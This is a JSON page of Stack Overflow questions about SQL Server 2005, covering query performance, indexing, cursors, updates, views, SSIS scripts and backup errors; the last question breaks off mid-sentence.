{"total":14387,"page":1,"pagesize":100,"questions":[{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":15,"score":2,"question_id":13298070,"title":"SQL Performance on DateDiff","body":"<p>How can I improve below sql:</p>\n\n<pre><code>dateDiff(d,a.DateValue,Convert(datetime, Convert(char(10), getdate(), 101) , 101))&gt;90\n</code></pre>\n\n<p>It is killing my performance.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":28,"score":4,"question_id":13297140,"title":"select where a and next is c, skipping b","body":"<p>I am wondering if it is possible in SQL to return a single row to show, using the table below as an example, only a row for id 2:</p>\n\n<pre><code>table1  ( id 2 and 4 are missing value b)\nid      value\n1         a\n1         b\n1         c\n1         d\n2         a\n2         c\n2         d \n3         a\n3         b\n3         c\n3         d\n4         a\n4         c\n4         d\n</code></pre>\n\n<p>i basically want to find all instances where 'b' does not exist but 'a' still does exist for any id and return a single row for that any given id. i have tried something like this, but its not working as i would want it to:</p>\n\n<pre><code>select * from table1 \n    where not exists (select distinct value from table1 where value b)   \n</code></pre>\n\n<p>i would like the end result to be something this, identifying the values where 'b' does not exist but 'a' does(not showing the value, is unneeded for final goal):</p>\n\n<pre><code>result table\nid        \n2           \n4          \n</code></pre>\n"},{"tags":["sql","sql-server-2005","sql-server-2008-r2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13296654,"title":"SQL multiple column index","body":"<p>I'm using SQL Server 2012. What is the difference between indexing a single non clustered non-key column and putting multiple columns and then indexing?</p>\n\n<p>If I have table with </p>\n\n<blockquote>\n  <ul>\n  <li>EmployeeID</li>\n  <li>DepartmentID</li>\n  <li>LocationID</li>\n  <li>Name</li>\n  <li>Address</li>\n  </ul>\n</blockquote>\n\n<p>If I create a single index on </p>\n\n<blockquote>\n  <ul>\n  <li>EmployeeID</li>\n  <li>DepartmentID</li>\n  </ul>\n</blockquote>\n\n<p>instead of just</p>\n\n<blockquote>\n  <ul>\n  <li>EmployeeID</li>\n  </ul>\n</blockquote>\n\n<p>What is the difference? I created <code>EmployeeID, DepartmentID</code> index, when I was searching any employee with <code>DepartmentID = X</code>, the SQL Management Studio Actual Execution Plan was suggesting that I create an index on <code>DepartmentID</code> even though the table had a non clustered index on <code>EmployeeID, DeparmentID</code>?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":33,"score":0,"question_id":13293975,"title":"Month year back (SQL)","body":"<p>I m trying to dig more in the SQL query , I'm with it.</p>\n\n<pre><code>Yearmo      Back_1_month\n-------     ------------\n 201202      201201            Where 201202 is Feb 2012 , 201201 is Jan 2012\n 201201      201112            \n 201204      201203            \n 201212      201211\n</code></pre>\n\n<p>I m confused , how can make it for 201201.</p>\n"},{"tags":["sql-server","sql-server-2005","dynamic-sql"],"answer_count":7,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":10418,"score":4,"question_id":1037174,"title":"sql use statement with variable","body":"<p>I'm trying to switch the current database with a SQL statement.\nI have tried the following, but all attempts failed:</p>\n\n<ol>\n<li>USE @DatabaseName</li>\n<li>EXEC sp_sqlexec @Sql -- where @Sql = 'USE [' + @DatabaseName + ']'</li>\n</ol>\n\n<p>To add a little more detail.</p>\n\n<p>EDIT: I would like to perform several things on two separate database, where both are configured with a variable. Something like this:</p>\n\n<pre><code>USE Database1\nSELECT * FROM Table1\n\nUSE Database2\nSELECT * FROM Table2\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":13151650,"title":"SQL Converting an INSERT SELECT to UPDATE as well","body":"<p>I have some SQL written up to address my problem but it is not quite ready. I have been attempting different queries for days now without much luck. FYI I inherited this DB so it may be a bit more advanced than what I am used to. </p>\n\n<p>There is a many-to-many relationship between Formula and Color using the bridge table FormulaColor. FormulaColor has the columns (FormulaId, ColorId, Percentage).</p>\n\n<p>My Business problem, we are converting all the formulas that use color A with the colors B(1%), C(2.8%) and D(96.2%). So if a Formula currently uses the color A as 50% of the formula then I would add a row for that formula with the B color and a percentage of .5%, a row for C color with a percentage of 1.4% and a row for D color with a percentage of 48.1%.</p>\n\n<p>The problem though, is a given formula that contains color A, may also already contain one or more of colors B, C or D. In that case I need to update the percentage by simply adding what was calculated above.</p>\n\n<p>The actual sql that I have so far is as follows. *Note that this is just for handling 1 of the new colors (ColorId=2594)</p>\n\n<pre><code>INSERT INTO FormulaColor (FormulaId, ColorId, Percentage) \nSELECT FormulaId, 2594 as ColorId, round((.01*FormulaColor.Percentage),2) as Percentage\nFROM FormulaColor WHERE ColorId=2595;\nDELETE FROM FormulaColor WHERE ColorId = 2595;\n</code></pre>\n\n<p>I was thinking that using the upsert method that uses @@rowscount is what I need? If so, I can't figure out how to do the update to just add the calculated amount to the percentage.</p>\n\n<p>Any help or resources is appreciated!</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>I ended up using the solution from Andriy M. In case it helps someone else out I am posting the actual SQL that I used.</p>\n\n<pre><code>DECLARE @DeletedColor int;\nDECLARE @Replacement TABLE (ColorId int, Percentage float);\n\n-- old ColorId getting replaced\nSET @DeletedColor = 2595\n\n-- new ColorId's and the percentages needed to recalculate\nINSERT INTO @Replacement (ColorId, Percentage) VALUES (2594, .01)\nINSERT INTO @Replacement (ColorId, Percentage) VALUES (2521, .028)\nINSERT INTO @Replacement (ColorId, Percentage) VALUES (2533, .962)\n\nSELECT\n  fc.FormulaId,\n  r.ColorId,\n  Percentage = round(fc.Percentage * r.Percentage, 2)\nINTO #FormulaColor\nFROM FormulaColor fc\nCROSS JOIN @Replacement r\nWHERE fc.ColorId = @DeletedColor\n;\n\nUPDATE old\nSET old.Percentage = old.Percentage + new.Percentage\nFROM FormulaColor old\nINNER JOIN #FormulaColor new\n ON old.FormulaId = new.FormulaId\nAND old.ColorId   = new.ColorId\n;\n\nINSERT INTO FormulaColor (FormulaId, ColorId, Percentage)\nSELECT new.FormulaId, new.ColorId, new.Percentage\nFROM #FormulaColor new\nLEFT JOIN FormulaColor old\n ON old.FormulaId = new.FormulaId\nAND old.ColorId   = new.ColorId\nWHERE old.FormulaId IS NULL\n;\n\nDELETE FROM FormulaColor WHERE ColorId = @DeletedColor;\n</code></pre>\n"},{"tags":["sql","sql-server","query","sql-server-2005","split"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13291954,"title":"SQL Query to split shipping cost over multiple items / rows","body":"<p>I am trying to create a query that will allow me to split a single figure over multiple rows.</p>\n\n<p>For example, purchase order x may have 15 items allocated to it.  Shipping cost is, say, 9.95.  How can I calculate 1/15th of 9.95 and then update the cost price of the stock with 1/15th of the shipping cost?</p>\n\n<p>Therefore the cost price of the item would increase from 4.50 to 5.16 (4.50 + 0.66).</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13279388,"title":"Subquery, Nested Select, Join, something else? - not sure","body":"<p>When I try limiting my results, I limit them too much.</p>\n\n<pre><code>Select Distinct Agreements.AgrmntID, Agreements.Status, JobSites.SiteName,\n  AgreementCharges.TotalSaleAmt, AgreementCharges.PartID,\n  AgreementSchedules.FormanEmpID, LaborCodeTypes.RepairCode\nFrom Agreements Inner Join\n  AgreementCharges On Agreements.AgrmntID = AgreementCharges.AgrmntID Inner Join\n  JobSites On JobSites.CustSiteID = Agreements.CustSiteID Left Outer Join\n  AgreementSchedules On Agreements.AgrmntID = AgreementSchedules.AgrmntID\n  Left Outer Join\n  LaborCodeTypes On LaborCodeTypes.RepairID = AgreementSchedules.RepairID\nWhere Agreements.Status = 2 And AgreementCharges.PartID = 31 And\n  LaborCodeTypes.RepairCode = '04 - LS'\n</code></pre>\n\n<p>If there is no RepairCode matching '04 - LS' I still need the AgrmntID and TotalSaleAmt.  Likewise, if there is no AgreementSchedule at all, I need AgrmntID and TotalSaleAmt.</p>\n\n<p>Output:</p>\n\n<pre><code>AgrmntID  Status  SiteName  TotalSaleAmt  PartID  FormanEmpID  RepairCode\n-------------------------------------------------------------------------\n2         2       TEST01    $100.00       31      66           04 - LS\n2         2       TEST03    $300.00       31      21           04 - LS\n</code></pre>\n\n<p>Expected Output:</p>\n\n<pre><code>AgrmntID  Status  SiteName  TotalSaleAmt  PartID  FormanEmpID  RepairCode\n-------------------------------------------------------------------------\n2         2       TEST01    $100.00       31      66           04 - LS\n2         2       TEST02    $200.00       31\n2         2       TEST03    $300.00       31      21           04 - LS\n</code></pre>\n\n<p>I've looked and looked and am now coming here for help.  Thank you in advance!!</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","sql-server-2008"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":5565,"score":0,"question_id":7430560,"title":"How to check if cursor exists (open status)","body":"<p>How do I check if a cursor is open or not? Because many times I am encountering the error 'Cursor already exists'. Please let me know how can I check whether a cursor is already in open status.</p>\n\n<p>In fact I have closed as well as Deallocated it at the end (CLOSE ppm_cursor; DEALLOCATE ppm_cursor;) But Still i am getting the same error what could be the reason.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","etl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13292222,"title":"ETL SQL Server 2008 - How to handle non-matching records?","body":"<p>I am fairly new to ETL. I am working on this proc and what it does is it loads birthdates of people. This is loaded from a fact table onto a different table. There is no key to join them by, all the three tables involved. I am going to split the Name field and do match with the split name. This loads the matching ones, but my question is I have to load the non matching ones to a different third table. How do I do that logic? </p>\n\n<pre><code>update FactTableEmp F\n       set Bdate = S.Birthdate\n\nfrom   FactTableEmp\n       cross apply dbo.split(Name) as u\n       join SourceTableEmp S on u.Fname = s.FirstName and u.LName = S.Lastname  \n\n--Is using the one below going to work using the same way above?\nu.Fnames != S.FirstName\nu.Lname != S.Lastname\n</code></pre>\n"},{"tags":["sql","sql-server-2005","sql-server-2008"],"answer_count":6,"favorite_count":3,"up_vote_count":13,"down_vote_count":0,"view_count":17167,"score":13,"question_id":545316,"title":"Is it possible to restore Sql Server 2008 backup in sql server 2005","body":"<p>Is it possible to restore a backup of a SQL Server 2008 database onto an instance of SQL Server 2005?</p>\n\n<p>I need to work on an sample application for which database backup is in sql server 2008.\nBut I'll not be able to install 2008. So is it possible to restore that back up in 2005?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13291423,"title":"SQL Server 2005 Import and Export Wizard","body":"<p>With reference to Import and Export Wizard, in SQL Server 2005 environment, I would like to receive some suggestions on how to select the best field separator: the table I need to export as flat file for example contains columns with commas inside them, so I can't use comma as field separator.</p>\n\n<p>I have thought to search in all tables what is the ASCII character (0-255) NOT PRESENT, and use this character as separator, but this search operation is computationally heavy.</p>\n\n<ul>\n<li>What type of character could I use for exporting a table as flat file?</li>\n<li>Could I use a couple of characters, for example <code>,$</code>    ?</li>\n<li>Is it preferable to use fixed length fields?</li>\n</ul>\n\n<p>Any suggestion would be appreciated.</p>\n\n<p>The best suggestion will be accepted.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","sql-update","database-update"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":9053805,"title":"Update statement issue","body":"<p>I have an issue that, while using sql server 2005 i have executed update query without where clause (by mistake) and all the original values of the column get lost.</p>\n\n<p>How can I get old values??</p>\n\n<p>Any suggestion/tips/solution is welcome and will be highly appreciated.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13289446,"title":"database email with attachement(excel file / pdf file)?","body":"<p>I've to send a mail from database to my mail-id with attachment.</p>\n\n<pre><code>EXEC msdb.dbo.sp_send_dbmail\n    @profile_name = 'Adventure Works Administrator',\n    @recipients = 'danw@Adventure-Works.com',\n    @query = 'SELECT COUNT(*) FROM AdventureWorks2012.Production.WorkOrder\n                  WHERE DueDate &gt; ''2004-04-30''\n                  AND  DATEDIFF(dd, ''2004-04-30'', DueDate) &lt; 2' ,\n    @subject = 'Work Order Count',\n    @attach_query_result_as_file = 1 ;\n</code></pre>\n\n<p>from this code i'm getting result in txt file. but <strong>i want to get query result in pdf file or excel file</strong></p>\n\n<p>anybody known means please share with me.</p>\n\n<p>advance thanks !!! :)</p>\n"},{"tags":["sql-server","sql-server-2005","view","sql-management-studio","rownumber"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13280520,"title":"ROW_NUMBER() in a view in SQL Server 2005","body":"<p>I have tried the following query in Microsoft SQL Server Management Studio:</p>\n\n<pre><code>select \n   ROW_NUMBER() OVER(ORDER BY ret_id, dep_id DESC) AS 'Row Number' \nfrom \n   Round_Trip_View\n</code></pre>\n\n<p>and it works.</p>\n\n<p>I have tried the same to create a view, and it crashed.</p>\n\n<p>Any idea?</p>\n\n<p>I am looking to assign a kind of id for each row in my view and I appreciate any alternative ideas :)</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":9,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":7828,"score":2,"question_id":1227707,"title":"How to get last insert/update/delete datetime on Sql Server 2005?","body":"<p>not a duplicate of <a href=\"http://stackoverflow.com/questions/1227593/how-to-get-last-modification-datetime-on-sql-server-2005\">my previous question</a></p>\n\n<p>Is there any way to get the latest datetime when a table/database had an insert/update/delete on Sql Server 2005? Preferably without creating triggers..</p>\n\n<p>I know that when you need the last update per row, you need triggers. But I am not sure if they are needed when you just want to get the last update for the whole table.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures","sql-update"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13288803,"title":"SQL Server : update multiple rows dynamically","body":"<p>I want to update multiple rows in my database, the values might be different. Imagine this table:</p>\n\n<pre><code>Username   FirstName   LastName \n-------------------------------\nuser1      John        Doe \nuser2      Jane        Doe\nuser3      bill        gates\n</code></pre>\n\n<p>If I want to update the table so it looks like this:</p>\n\n<pre><code>Username   FirstName   LastName \n-------------------------------\nuser1      John        Deer \nuser2      Jane        Farmer\nuser3      Gill        Bates\n</code></pre>\n\n<p>Is it best to use one <code>UPDATE</code> statement for each user? Or is it possible to do this with one query?</p>\n\n<p>Also is it possible to put it in a stored procedure and provide a collection of values?</p>\n\n<p>Second question is it best to check if the values are changed before doing an update? Or just update everyone even if the value is the same? </p>\n\n<p>I am currently using SQL Server 2005 and C# for the application if that is relevant.</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13285346,"title":"How to write this query in SQL Server 2005","body":"<p><img src=\"http://i.stack.imgur.com/ZngpX.jpg\" alt=\"enter image description here\"></p>\n\n<p>This table is showing that</p>\n\n<ul>\n<li><code>Emp 1</code> has worked for 7.0 hours on <code>Project 1</code> on 14/1/2010.</li>\n<li><code>Emp 2</code> has worked for 8.0 hours on <code>Project 2</code> on 15/1/2010.</li>\n<li><code>Emp 1</code> has worked for 8.0 hours on <code>Project 1</code> on 16/1/2010.</li>\n</ul>\n\n<p>I want to update that table like this:</p>\n\n<ul>\n<li>I want to update the column [14 Jan] column first row with 7.0 for Emp 1</li>\n<li>I want to update the column [15 Jan] column second row with 8.0 for Emp 2</li>\n<li>I want to update the column [16 Jan] column third row with 8.0 for Emp 1</li>\n</ul>\n\n<p>Hence the result should be:</p>\n\n<p><img src=\"http://i.stack.imgur.com/CA4l7.jpg\" alt=\"enter image description here\"></p>\n\n<p>Can anybody please suggest me how to write the query for the same in SQL Server 2005?</p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":4033,"score":1,"question_id":4856089,"title":"How to update a part of the string using replace function in tsql?","body":"<p>Hi\nI have a column of nvarchar(1000) type. I need to get rid of encode characters from that column and replace them with their special characters.\nFor Example:</p>\n\n<pre><code>column value is : 'This text values contains this '&amp;amp;' this'.\n</code></pre>\n\n<p>I have to replace <code>'&amp;amp;'</code> with '&amp;'.</p>\n\n<ol>\n<li>First have to find the record which has <code>'&amp;amp;'</code> in the column (may be using like condition)</li>\n<li>And then replace only this word with its special character</li>\n</ol>\n\n<p>How do i do that? Pl. help</p>\n"},{"tags":["sql-server","sql-server-2005","transaction-log"],"answer_count":21,"favorite_count":37,"up_vote_count":90,"down_vote_count":0,"view_count":203350,"score":90,"question_id":56628,"title":"How do you clear the transaction log in a SQL Server 2005 database?","body":"<p>I'm not a SQL expert, and I'm reminded of the fact every time I need to do something beyond the basics. I have a test database that is not large in size, but the transaction log definitely is. How do I clear out the transaction log?</p>\n"},{"tags":["c#","jquery","asp.net",".net","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":118,"score":0,"question_id":10489740,"title":"Good way to determine if someone left a webpage","body":"<p>I am trying to code an app for work where our clients can edit certain fields. When they click edit, the code will lock the data to be editted. And when they click save the data will unlock. But I am having trouble deciding if I can unlock the data when they click elsewhere, go to another page or site, or even close the browser.</p>\n\n<p>What's a good way to decide if the user has left the edit page?</p>\n\n<p>(We are using C# .NET 3.5 and JQuery and a SQL Server 2005 DB).</p>\n"},{"tags":["sql","sql-server-2005","query-optimization"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":540,"score":0,"question_id":2355231,"title":"Problem using ROW_NUMBER() to get records randomly (SQL Server 2005)","body":"<p>I want to get 1000 records from a table randomly, so I use:</p>\n\n<pre><code>SELECT top 1000 \n       mycol1\n     , mycol2\n     , ROW_NUMBER() OVER (ORDER BY NEWID()) rn\nFROM mytable\n</code></pre>\n\n<p>However, I don't want to see <code>rn</code> in my resultset, so I do:</p>\n\n<pre><code>SELECT mycol1\n     , mycol2\nFROM (\n    SELECT top 1000 \n           mycol1\n         , mycol2\n         , ROW_NUMBER() OVER (ORDER BY NEWID()) rn\n    FROM mytable\n) a\n</code></pre>\n\n<p>When I do this, the results do not come randomly anymore. They come as if I just said top 10000 <strong>without</strong> randomization using row_number().</p>\n\n<p>When I change the query to </p>\n\n<pre><code>SELECT mycol1\n     , mycol2\n     , rn\nFROM (\n    SELECT top 1000 \n           mycol1\n         , mycol2\n         , ROW_NUMBER() OVER (ORDER BY NEWID()) rn\n    FROM mytable\n) a\n</code></pre>\n\n<p>they are random again.</p>\n\n<p>I guess sql server does some kind of optimization, saying \"hey, this guy doesn't need the column <code>rn</code> anyway, so just ignore it\". But this results to an unexpected behavior in this case. Is there any way to avoid this?</p>\n\n<p>PS: I use the ROW_NUMBER() trick because mytable has 10 mio. rows and </p>\n\n<pre><code>SELECT top 10000 *\nFROM mytable\nORDER BY NEWID()\n</code></pre>\n\n<p>runs forever, whereas with ROW_NUMBER() it takes only up to 30 secs.</p>\n"},{"tags":["sql-server-2005","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4914,"score":0,"question_id":733744,"title":"SQL server Error 4060","body":"<p>4060 \"Server rejected the connection; Access to selected database has been denied\".</p>\n\n<p>How can I troubleshoot this error?</p>\n"},{"tags":["sql-server-2005","vpn"],"answer_count":10,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":13013,"score":4,"question_id":669372,"title":"Not connecting to SQL Server over VPN","body":"<p>I have connected for the first time to an existing network over VPN. I can ping the IP address which is used by the SQL Server from the VPN client, but SSMS does not connect to the SQL Server. I am using the right login id and password.</p>\n\n<p>Why could this happen ? Any ideas ?</p>\n\n<p>Thanks,\nChakravarthy</p>\n"},{"tags":["sql","sql-server","database","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":23,"score":2,"question_id":13274950,"title":"list all tables that don't exist but are used in a view sql server","body":"<p>I can't seem to get all the table names that a view is trying to use.</p>\n\n<p>Currently, I am using <code>INFORMATION_SCHEMA.VIEW_COLUMN_USAGE</code> to find which tables are used. But, it only finds tables that currently exist. I want to find out if that view is trying to use tables that don't exist.</p>\n\n<p><code>View_Column_Usage</code> will only find columns that are used in the view. You can check to see if those columns are in any of the current tables columns to find which columns aren't used, but you can't find which tables aren't used.</p>\n\n<p>Does anyone know a table I can use to find which tables are used in a view, but do not exist?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13262657,"title":"Date calculation in variable","body":"<p>I'm doing my best to set a date variable so I can compare it later.  I would like something that basically says:</p>\n\n<p>If the current day-of-month is less than 11, then date is 10th of LAST month<br>\nIf the current day-of-month is greater-than-or-equal-to 11, then date is 10th of THIS month</p>\n\n<p>Date is 11/6/2012 expected output:</p>\n\n<pre><code>@PODate = 10/10/2012\n</code></pre>\n\n<p>Date is 11/16/2012 expected output:</p>\n\n<pre><code>@PODate = 11/10/2012\n</code></pre>\n\n<p>Currently all I have is this:</p>\n\n<pre><code>DECLARE @PODate as DATETIME\nSet @PODate = Convert(varchar(8),GetDate(),1)\n</code></pre>\n\n<p>Any tips or help would be greatly appreciated.  Thank you!!</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13274296,"title":"Auto Increment feature of SQL Server","body":"<p>I have created a table named as ABC. It has three columns which are as follows:-</p>\n\n<p><img src=\"http://i.stack.imgur.com/3sx3t.png\" alt=\"enter image description here\">              </p>\n\n<p>The column <code>number_pk</code> <code>(int)</code> is the <strong>primary key</strong> of my table in which I have made the <code>auto increment</code> feature on for that column.</p>\n\n<p>Now I have deleted two rows from that table say <code>Number_pk= 5</code> and <code>Number_pk =6</code>.</p>\n\n<p>The table which I get now is like this:-</p>\n\n<p><img src=\"http://i.stack.imgur.com/bTpbm.png\" alt=\"enter image description here\"></p>\n\n<p>Now if I again enter two new rows in this table with the same value I get the two new <code>Number_pk starting from 7 and 8</code> i.e,</p>\n\n<p><img src=\"http://i.stack.imgur.com/Y3fLv.png\" alt=\"enter image description here\"></p>\n\n<p>My question is that what is the logic behind this since I have deleted the two rows from the table. I know that a simple answer is because I have set the auto increment on for the primary key of my table. But I want to know is there any way that I can insert the two new entries starting from the last Number_pk without changing the design of my table?</p>\n\n<p>And how the <strong><em>SQL Server manage this record since I have deleted the rows from the database??</em></strong></p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":87,"score":1,"question_id":13213884,"title":"Why am I getting object reference not set error on script task connector?","body":"<p>I have an SSIS package (SQL Server 2005) that loops through a bunch of flat files in a folder. I need to wait until the source application has finished writing the file before I can open it in my flat file import task.</p>\n\n<p>I have a For Each loop container and within it a script task to execute before the Data Flow Task.</p>\n\n<p>When I try to create the success connector between the Script Task and the Data Flow Task I get this error: </p>\n\n<blockquote>\n  <p><em>Could not create connector. Object reference not set to an instance of\n  an object.</em></p>\n</blockquote>\n\n<p>I get that something is being set to nothing, but I can't see it. I have <code>DelayValidation</code> set to true on both the Script Task and the Data Flow Task. What else am I missing?</p>\n\n<p>I'm a C# guy so maybe I'm missing something obvious in the VB. Here's the script I poached from the interwebs:</p>\n\n<pre><code>Public Sub Main()\n    Dim strFileName As String = CType(Dts.Variables(\"FileName\").Value, String)\n    Dim objFS As System.IO.FileStream\n    Dim bolFinished As Boolean = False\n\n    Do\n        Try\n            objFS = System.IO.File.Open(strFileName, FileMode.Open, FileAccess.ReadWrite, FileShare.None)\n            bolFinished = True\n            objFS.Close()\n        Catch ex As Exception\n            System.Threading.Thread.Sleep(1000)\n        End Try\n    Loop\n\n    If bolFinished Then\n        Dts.TaskResult = Dts.Results.Success\n    Else\n        Dts.TaskResult = Dts.Results.Failure\n    End If\nEnd Sub\n</code></pre>\n"},{"tags":["c#","sql-server","sql-server-2005","sql-server-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2113,"score":1,"question_id":6824188,"title":"SqlDataSourceEnumerator.Instance.GetDataSources() does not locate local SQL server 2008 instance","body":"<p>I use the following code to list all the remote and local SQL Server instances:</p>\n\n<pre><code>public static void LocateSqlInstances()\n  {\n     using( DataTable sqlSources = SqlDataSourceEnumerator.Instance.GetDataSources())\n     {\n        foreach(DataRow source in sqlSources.Rows )\n        {\n           string instanceName = source[\"InstanceName\"].ToString();\n\n           if (!string.IsNullOrEmpty(instanceName))\n           {\n              Console.WriteLine(\" Server Name:{0}\", source[\"ServerName\"]);\n              Console.WriteLine(\"   Instance Name:{0}\", source[\"InstanceName\"]);\n              Console.WriteLine(\"   Version:{0}\", source[\"Version\"]);\n              Console.WriteLine();\n           }\n        }\n        Console.ReadKey();\n     }\n  }\n</code></pre>\n\n<p>running the code on my local machine. The code can find and list a SQL server express instance (version 9.0.5000) installed but failed to list the other SQL server instance (version 10.0.1600).</p>\n\n<p>I've done a lot of research on the Internet and made sure that 1-the Sql Broswer is runing and 2 - the UDP port 1434 is open.</p>\n\n<p>Anybody knows why? Thanks.</p>\n"},{"tags":["sql-server","sql-server-2005","security"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1321,"score":2,"question_id":5166641,"title":"SQL Server Foreign Keys across database boundaries - techniques for enforcement","body":"<p>I have two separate SQL Server 2005 databases (on the same server) </p>\n\n<ul>\n<li>security database  </li>\n<li><p>main application database</p></li>\n<li><p>The security database has a  <strong>user table</strong> with everything needed to authenticate.  - </p></li>\n<li>The application database has a <strong>person table</strong> with extended user details. There is a 1-1 mapping between the security database user table and the application database person table.</li>\n</ul>\n\n<p>I want to enforce a mapping between the user and the person table. I'm assuming that foreign keys can't be mapped across databases thus I am wondering what to do to enforce the integrity of the relationship.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":33,"score":0,"question_id":13269545,"title":"SQL View creation error","body":"<p>I am trying to copy a view from one database to another and get the error :</p>\n\n<blockquote>\n  <p>Msg 4121, Level 16, State 1, Procedure vwPAProjects_Summary_New_2 \n  Line 2<br>\n  <em>Cannot find either column \"dbo\" or the user-defined function or\n  aggregate \"dbo.GetContractName\", or the name is ambiguous</em></p>\n</blockquote>\n\n<p>The view I am copying over is:</p>\n\n<pre><code>USE [GRAUD]\nGO\n/****** Object:  View [dbo].[vwPAProjects_Summary_New_2]    Script Date: 11/07/2012 11:57:30 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nCREATE VIEW [dbo].[vwPAProjects_Summary_New_2] AS \nselect\n dbo.GetContractName(PAPROJNUMBER) 'CONTRACT',\nPACONTNUMBER,\nisnull(dbo.GetEmployeeName(PABusMgrID),dbo.GetContractPartner(PACONTNUMBER)) 'Project Manager ID',\ncase PASTAT\nwhen 1 then 'Open'\nelse 'Closed'\nend 'Status',\ncase PAProjectType\nwhen 3 then 'Fixed Price'\nelse 'Time and Materials'\nend 'Project Type',\nPAProject_Fee_Amount 'Project Fee Amount',\nPAFTotalCost 'Forecast Total Cost',\n(PAProject_Fee_Amount - PAFTotalCost) 'Forcast Profit',\ncase\n    when PAProject_Fee_Amount = 0 then '0.00%'\n    else cast(cast(((PAProject_Fee_Amount - PAFTotalCost)/PAProject_Fee_Amount)*100 as decimal(19,2)) as varchar(21)) + '%'\nend 'Forcast %',\nPAPostedBillingsN 'Actual Billings',\nPAPostedTotalCostN 'Actual Total Cost',\n(PAPostedBillingsN - PAPostedTotalCostN) 'Current Actual Profit',\ncase\n    when PAPostedBillingsN = 0 then '0.00%'\n    else cast(cast(((PAPostedBillingsN - PAPostedTotalCostN)/PAPostedBillingsN)*100 as decimal(19,2)) as varchar(21)) + '%'\nend 'Current %'\n\nfrom PA01201\nwhere PASTAT = 1\n</code></pre>\n\n<p>Can anybody advise on how I can get this to copy over?  It has worked on other databases after I have copied it over but I cannot see any differences that would stop it this time?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13269787,"title":"SQL Server backup failing. Error: 3041, Severity: 16, State: 1","body":"<p>First of all, I'm very new at stackoverflow, so please bear with me.</p>\n\n<p>I'm running a SQL Server 9.0.4060.</p>\n\n<p>My problem is: my SQL Server backup keeps failing on a lot of the databases.</p>\n\n<p>The Maintenance plan runs to different backup jobs:</p>\n\n<p>DIFF backup everyday at 20:30 and FULL backup every Sunday at 20:30.</p>\n\n<p>I get these two errors foreach database that fails to complete the backup:</p>\n\n<pre><code>Date        06-11-2012 20:31:06\nLog     SQL Server (Current - 07-11-2012 11:43:00)\nSource      Backup\nMessage\nBACKUP failed to complete the command BACKUP DATABASE (dbname) WITH DIFFERENTIAL. Check the backup application log for detailed messages.\n\nDate        06-11-2012 20:31:06\nLog     SQL Server (Current - 07-11-2012 11:43:00)\nSource      Backup\nMessage\nError: 3041, Severity: 16, State: 1.\n</code></pre>\n\n<p>If you guys need any other information, just say the 